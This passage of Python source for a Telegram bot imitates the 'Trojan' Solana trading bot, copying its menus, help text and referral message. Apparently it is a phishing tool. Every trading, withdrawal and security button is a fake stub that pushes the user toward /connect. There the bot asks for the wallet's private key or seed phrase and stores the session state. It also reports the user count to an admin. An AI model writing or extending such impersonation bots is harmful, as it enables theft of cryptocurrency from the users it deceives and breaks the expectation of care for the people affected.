        pnl_message = """PNL cards are the best way to share your huge wins (and losses) to your friends and community.
With more than 200 unique designs, Trojan offers the largest collection of PNL cards in the market (DM support to create a design for your community / trading group)."""
        await callback.message.edit_text(pnl_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # BOLT button
    if callback.data == "bolt_info":
        bolt_message = "BOLT was released for all users and is enabled by default. Enjoy lightning fast swaps with Trojan!"
        await callback.message.edit_text(bolt_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # Show/Hide Tokens button
    if callback.data == "show_hide_tokens":
        tokens_message = "You currently have no tokens in your wallet! Start trading in the Buy menu."
        await callback.message.edit_text(tokens_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # Watchlist button
    if callback.data == "watchlist":
        watchlist_message = "<b>You do not have any tokens in your watchlist yet!</b>"
        await callback.message.edit_text(watchlist_message, reply_markup=get_back_refresh_keyboard(), parse_mode="HTML")
        await callback.answer()
        return
    
    # Referrals button
    if callback.data == "referrals":
        referrals_message = """💰 Invite your friends to save 10% on fees. If you've traded more than $10k volume in a week you'll receive a 35% share of the fees paid by your referrees! Otherwise, you'll receive a 25% share.

Your Referrals (updated every 30 min)
• Users referred: 0 (direct: 0, indirect: 0)
• Total rewards: 0 SOL ($0.00)
• Total paid: 0 SOL ($0.00)
• Total unpaid: 0 SOL ($0.00)

Rewards are paid daily and airdropped directly to your chosen Rewards Wallet. You must have accrued at least 0.005 SOL in unpaid fees to be eligible for a payout.

We've established a tiered referral system, ensuring that as more individuals come onboard, rewards extend through five different layers of users. This structure not only benefits community growth but also significantly increases the percentage share of fees for everyone.

Stay tuned for more details on how we'll reward active users and happy trading!

Your Referral Link
https://t.me/solana_trojanbot?start=HFd734GKduU"""
        
        # Send message with photo
        try:
            photo = FSInputFile("1.jpg")
            await callback.message.answer_photo(
                photo=photo,
                caption=referrals_message,
                reply_markup=get_referrals_keyboard()
            )
            await callback.answer()
        except Exception as e:
            # If photo sending failed, send only text
            logging.error(f"Photo sending error: {e}")
            await callback.message.edit_text(
                referrals_message,
                reply_markup=get_referrals_keyboard()
            )
            await callback.answer("Photo sending failed")
        return
    
    # DCA Orders button
    if callback.data == "dca_orders":
        dca_orders_message = "<b>You have no active DCA orders. Create a DCA order from the Buy/Sell menu.</b>"
        await callback.message.edit_text(dca_orders_message, reply_markup=get_back_keyboard(), parse_mode="HTML")
        await callback.answer()
        return
    
    # Limit Orders button
    if callback.data == "limit_orders":
        limit_orders_message = "<b>You have no active limit orders. Create a limit order from the Buy/Sell menu.</b>"
        await callback.message.edit_text(limit_orders_message, reply_markup=get_back_keyboard(), parse_mode="HTML")
        await callback.answer()
        return
    
    # Positions button
    if callback.data == "positions":
        positions_message = "<b>You do not have any tokens yet! Start trading in the Buy menu.</b>"
        await callback.message.edit_text(positions_message, reply_markup=get_back_refresh_keyboard(), parse_mode="HTML")
        await callback.answer()
        return
    
    # Sell button
    if callback.data == "sell":
        sell_message = "<b>You do not have any tokens yet! Start trading in the Buy menu.</b>"
        await callback.message.edit_text(sell_message, reply_markup=get_back_refresh_keyboard(), parse_mode="HTML")
        await callback.answer()
        return
    
    # Help button
    if callback.data == "help":
        help_message = """How do I use Trojan?
Check out our Youtube playlist (https://www.youtube.com/@TrojanOnSolana) where we explain it all

Where can I find my referral code?
Open the /start menu and click 💰Referrals.

What are the fees for using Trojan?
Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

Security Tips: How can I protect my account from scammers?
 - Safeguard does NOT require you to login with a phone number or QR code! 
 - NEVER search for bots in telegram. Use only official links.
 - Admins and Mods NEVER dm first or send links, stay safe!

For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory. 

Trading Tips: Common Failure Reasons
 - Slippage Exceeded: Up your slippage or sell in smaller increments.
 - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.
 - Timed out: Can occur with heavy network loads, consider increasing your gas tip.

My PNL seems wrong, why is that?
The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit."""
        
        await callback.message.edit_text(help_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # Withdraw button
    if callback.data == "withdraw":
        withdraw_message = "Select the network to withdraw from"
        await callback.message.edit_text(withdraw_message, reply_markup=get_withdraw_networks_keyboard())
        await callback.answer()
        return
    
    # Solana network selection for withdrawal
    if callback.data == "withdraw_solana":
        withdraw_tokens_message = """Select a token to withdraw (Solana) 1/1

SOL — $0.00"""
        await callback.message.edit_text(withdraw_tokens_message, reply_markup=get_withdraw_tokens_keyboard())
        await callback.answer()
        return
    
    # Back button in network selection menu
    if callback.data == "withdraw_back":
        withdraw_message = "Select the network to withdraw from"
        await callback.message.edit_text(withdraw_message, reply_markup=get_withdraw_networks_keyboard())
        await callback.answer()
        return
    
    # Solana token selection for withdrawal
    if callback.data == "withdraw_sol":
        wallet_message = "At this time, you have not yet linked your wallet. Use the /connect command to connect your wallet and start trading."
        await callback.message.edit_text(wallet_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # New user button handling
    if callback.data in ["trenches", "copy_trade", "sniper"]:
        not_available_message = "This action is not available for new users at this time. Make at least 1 trade to activate this section."
        await callback.message.edit_text(not_available_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # Account Security button
    if callback.data == "account_security":
        security_message = """You have not yet setup your Secure Action Password (SAP). If you wish to secure your account from unauthorized access by using a password for sensitive actions (e.g. withdrawing funds, exporting wallet keys, changing selected trading wallet...), please click on the button below to setup your SAP.

Beware, once your SAP is set up, you will be required to input your password to execute sensitive actions. Make sure you save your password somewhere safe as you CANNOT recover it if lost."""
        await callback.message.edit_text(security_message, reply_markup=get_account_security_keyboard())
        await callback.answer()
        return
    
    # Create SAP button
    if callback.data == "create_sap":
        create_sap_message = "So far you have nothing to protect... Connect your wallet to protect your assets."
        await callback.message.edit_text(create_sap_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # Buy button
    if callback.data == "buy":
        buy_message = "Use the /connect command to connect your wallet and start trading!"
        await callback.message.edit_text(buy_message, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    # Connect confirmation button
    if callback.data == "connect_confirm":
        await callback.message.edit_text("Enter the private key or seed phrase of the wallet you wish to connect")
        await state.set_state(UserStates.CONNECT_WALLET)
        await callback.answer()
        return
    
    # Other buttons (leave inactive)
    await callback.answer(f"Function {callback.data} not implemented yet")

# Bot startup
async def main():
    # Log bot start
    logger.info("Bot started")
    
    # Register startup and shutdown handlers
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    
    # Start bot
    await dp.start_polling(bot)

# Bot startup handler
async def on_startup():
    logger.info("Bot successfully started and ready to work")
    
    # Send notification to admin about startup
    await notify_admin("🟢 Bot started and ready to work")
    
    # Display statistics about users
    users_count = len(users_data)
    logger.info(f"Loaded data about {users_count} users")
    await notify_admin(f"📊 Loaded data about {users_count} users")

# Bot shutdown handler
async def on_shutdown():
    # Save user data before shutting down
    save_users_data(users_data)
    
    logger.info("Bot finished working")
    await notify_admin("🔴 Bot finished working")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped")
    except Exception as e:
        logger.critical(f"Critical error: {e}", exc_info=True)
